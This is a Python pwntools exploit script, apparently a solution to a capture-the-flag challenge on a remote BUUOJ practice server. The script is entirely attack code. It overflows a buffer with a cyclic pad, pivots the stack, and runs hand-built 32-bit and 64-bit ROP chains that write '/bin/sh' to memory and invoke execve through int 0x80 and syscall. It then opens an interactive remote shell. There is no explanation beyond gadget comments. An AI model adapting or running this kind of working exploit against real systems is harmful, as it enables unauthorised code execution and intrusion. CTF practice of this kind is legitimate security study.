from pwn import *
from struct import pack 


# sh = process("./pwn2")
sh = remote("node4.buuoj.cn", 29700)

# Padding goes here
p = cyclic(0x10c+0x4)
p += p32(0x080a8f69)         # add esp, 0xc ; ret
p += p32(0)                  # padding
p += p64(0x000000000046d438) # add rsp, 0x48 ; ret

# 32 ropchain 
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9060) # @ .data
p += pack('<I', 0x080a8af6) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9064) # @ .data + 4
p += pack('<I', 0x080a8af6) # pop eax ; ret
p += b'/sh\x00'
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e9f1) # pop edx ; pop ecx ; pop ebx ; ret
p += p32(0)
p += p32(0)
p += pack('<I', 0x080d9060) # @ .data
p += pack('<I', 0x080a8af6) # pop eax ; ret
p += p32(0xb)
p += pack('<I', 0x080495a3) # int 0x80
p += p32(0)  # padding

# 64 ropchain
p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
p += pack('<Q', 0x00000000006a10e0) # @ .data
p += pack('<Q', 0x000000000043b97c) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
p += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004005f6) # pop rdi ; ret
p += pack('<Q', 0x00000000006a10e0) # @ .data
p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
p += pack('<Q', 0x000000000043b9d5) # pop rdx ; ret
p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
p += pack('<Q', 0x000000000043b97c) # pop rax ; ret
p += p64(0x3b)
p += pack('<Q', 0x00000000004011dc) # syscall

sh.send(p)
sh.interactive()


